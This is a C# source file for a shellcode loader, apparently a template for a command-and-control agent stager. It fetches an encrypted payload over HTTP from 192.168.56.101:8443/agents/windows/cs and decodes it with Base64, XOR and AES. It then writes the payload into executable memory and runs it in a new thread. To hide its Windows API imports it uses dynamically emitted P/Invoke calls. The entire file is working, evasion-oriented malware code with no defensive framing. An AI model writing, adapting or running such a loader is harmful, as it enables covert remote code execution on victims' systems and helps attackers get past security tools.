using System;
using System.Net;
using System.Runtime.InteropServices;
using System.IO.MemoryMappedFiles;
using System.Text;
using System.Threading;
using System.Reflection;
using System.Reflection.Emit;

namespace ShellcodeLoader
{
    public class Loader
    {
        public static object DynamicPInvokeBuilder(Type type, string library, string method, Object[] args, Type[] paramTypes)
        {
            AssemblyName assemblyName = new AssemblyName("Temp01");
            AssemblyBuilder assemblyBuilder = AppDomain.CurrentDomain.DefineDynamicAssembly(assemblyName, AssemblyBuilderAccess.Run);
            ModuleBuilder moduleBuilder = assemblyBuilder.DefineDynamicModule("Temp02");

            MethodBuilder methodBuilder = moduleBuilder.DefinePInvokeMethod(method, library, MethodAttributes.Public | MethodAttributes.Static | MethodAttributes.PinvokeImpl, CallingConventions.Standard, type, paramTypes, CallingConvention.Winapi, CharSet.Ansi);

            methodBuilder.SetImplementationFlags(methodBuilder.GetMethodImplementationFlags() | MethodImplAttributes.PreserveSig);
            moduleBuilder.CreateGlobalFunctions();

            MethodInfo dynamicMethod = moduleBuilder.GetMethod(method);
            object res = dynamicMethod.Invoke(null, args);
            return res;
        }

        public static IntPtr VirtualAlloc(IntPtr lpAddress, UInt32 dwSize, UInt32 flAllocationType, UInt32 flProtect)
        {
            Type[] paramTypes = { typeof(IntPtr), typeof(UInt32), typeof(UInt32), typeof(UInt32) };
            Object[] args = { lpAddress, dwSize, flAllocationType, flProtect };
            object res = DynamicPInvokeBuilder(typeof(IntPtr), "Kernel32.dll", "VirtualAlloc", args, paramTypes);
            return (IntPtr)res;
        }

        public static IntPtr CreateThread(UInt32 lpThreadAttributes, UInt32 dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, UInt32 dwCreationFlags, ref UInt32 lpThreadId)
        {
            Type[] paramTypes = { typeof(UInt32), typeof(UInt32), typeof(IntPtr), typeof(IntPtr), typeof(UInt32), typeof(UInt32).MakeByRefType() };
            Object[] args = { lpThreadAttributes, dwStackSize, lpStartAddress, lpParameter, dwCreationFlags, lpThreadId };
            object res = DynamicPInvokeBuilder(typeof(IntPtr), "Kernel32.dll", "CreateThread", args, paramTypes);
            return (IntPtr)res;
        }

        public static Int32 WaitForSingleObject(IntPtr Handle, UInt32 Wait)
        {
            Type[] paramTypes = { typeof(IntPtr), typeof(UInt32) };
            Object[] args = { Handle, Wait };
            object res = DynamicPInvokeBuilder(typeof(Int32), "Kernel32.dll", "WaitForSingleObject", args, paramTypes);
            return (Int32)res;
        }

        public enum StateEnum
        {
            MEM_COMMIT = 0x1000,
            MEM_RESERVE = 0x2000,
            MEM_FREE = 0x10000
        }

        public enum Protection
        {
            PAGE_READONLY = 0x02,
            PAGE_READWRITE = 0x04,
            PAGE_EXECUTE = 0x10,
            PAGE_EXECUTE_READ = 0x20,
            PAGE_EXECUTE_READWRITE = 0x40,
        }

        [DllImport("bcrypt.dll")]
        public static extern uint BCryptOpenAlgorithmProvider(out IntPtr phAlgorithm, [MarshalAs(UnmanagedType.LPWStr)] string pszAlgId, [MarshalAs(UnmanagedType.LPWStr)] string pszImplementation, uint dwFlags);

        [DllImport("bcrypt.dll")]
        public static extern uint BCryptSetProperty(IntPtr hObject, [MarshalAs(UnmanagedType.LPWStr)] string pszProperty, byte[] pbInput, uint cbInput, uint dwFlags);

        [DllImport("bcrypt.dll")]
        public static extern uint BCryptGenerateSymmetricKey(IntPtr hAlgorithm, out IntPtr phKey, IntPtr pbKeyObject, uint cbKeyObject, byte[] pbSecret, uint cbSecret, uint dwFlags);

        [DllImport("bcrypt.dll")]
        public static extern uint BCryptDecrypt(IntPtr hKey, byte[] pbInput, uint cbInput, IntPtr pPaddingInfo, byte[] pbIV, uint cbIV, byte[] pbOutput, uint cbOutput, out uint pcbResult, uint dwFlags);

        // XOR decryption
        private static byte[] XORDecrypt(byte[] data, byte[] key)
        {
            byte[] decrypted = new byte[data.Length];
            for (int i = 0; i < data.Length; i++)
            {
                decrypted[i] = (byte)(data[i] ^ key[i % key.Length]);
            }
            return decrypted;
        }

        [Flags]
        public enum AllocationType
        {
            Commit = 0x1000,
            Reserve = 0x2000,
            Decommit = 0x4000,
            Release = 0x8000,
            Reset = 0x80000,
            Physical = 0x400000,
            TopDown = 0x100000,
            WriteWatch = 0x200000,
            LargePages = 0x20000000
        }

        [Flags]
        public enum MemoryProtection
        {
            Execute = 0x10,
            ExecuteRead = 0x20,
            ExecuteReadWrite = 0x40,
            ExecuteWriteCopy = 0x80,
            NoAccess = 0x01,
            ReadOnly = 0x02,
            ReadWrite = 0x04,
            WriteCopy = 0x08,
            GuardModifierflag = 0x100,
            NoCacheModifierflag = 0x200,
            WriteCombineModifierflag = 0x400
        }

        public static string host = "192.168.56.101";
        public static string port = "8443";

        static byte[] getterShellcode()
        {
            byte[] shellcode;

            using (var client = new WebClient())
            {
                shellcode = client.DownloadData("http://" + host + ":" + port + "/agents/windows/cs");
            }

            // Base64 decoding
            shellcode = Convert.FromBase64String(Encoding.UTF8.GetString(shellcode));

            // XOR decryption
			var xorKey = Convert.FromBase64String("#1"); // XOR key
            shellcode = XORDecrypt(shellcode, xorKey);

            // AES decryption process
            var hAlgorithm = IntPtr.Zero;
            var ntStatus = BCryptOpenAlgorithmProvider(out hAlgorithm, "AES", null, 0);
            if (ntStatus != 0)
                throw new Exception("BCryptOpenAlgorithmProvider failed with status " + ntStatus);

            var chainingMode = Encoding.Unicode.GetBytes("ChainingModeCBC\0");
            ntStatus = BCryptSetProperty(hAlgorithm, "ChainingMode", chainingMode, (uint)chainingMode.Length, 0);
            if (ntStatus != 0)
                throw new Exception("BCryptSetProperty failed with status " + ntStatus);

			var key = Convert.FromBase64String("#2"); // AES-256 key
            var hKey = IntPtr.Zero;
            ntStatus = BCryptGenerateSymmetricKey(hAlgorithm, out hKey, IntPtr.Zero, 0, key, (uint)key.Length, 0);
            if (ntStatus != 0)
                throw new Exception("BCryptGenerateSymmetricKey failed with status " + ntStatus);

			var iv = Convert.FromBase64String("#3"); // AES IV
            var decryptedShellcode = new byte[shellcode.Length];
            uint decryptedShellcodeSize;
            ntStatus = BCryptDecrypt(hKey, shellcode, (uint)shellcode.Length, IntPtr.Zero, iv, (uint)iv.Length, decryptedShellcode, (uint)shellcode.Length, out decryptedShellcodeSize, 0);
            if (ntStatus != 0)
                throw new Exception("BCryptDecrypt failed with status " + ntStatus);

            shellcode = decryptedShellcode;

            return shellcode;
        }

        static void Main(string[] args)
        {

            byte[] x64shellcode = getterShellcode();

            IntPtr funcAddr = VirtualAlloc(
                              IntPtr.Zero,
                              (uint)x64shellcode.Length,
                              (uint)StateEnum.MEM_COMMIT,
                              (uint)Protection.PAGE_EXECUTE_READWRITE);
            Marshal.Copy(x64shellcode, 0, (IntPtr)(funcAddr), x64shellcode.Length);

            IntPtr hThread = IntPtr.Zero;
            uint threadId = 0;
            IntPtr pinfo = IntPtr.Zero;

            hThread = CreateThread(0, 0, funcAddr, pinfo, 0, ref threadId);
            WaitForSingleObject(hThread, 0xFFFFFFFF);
            return;
        }
    }
}
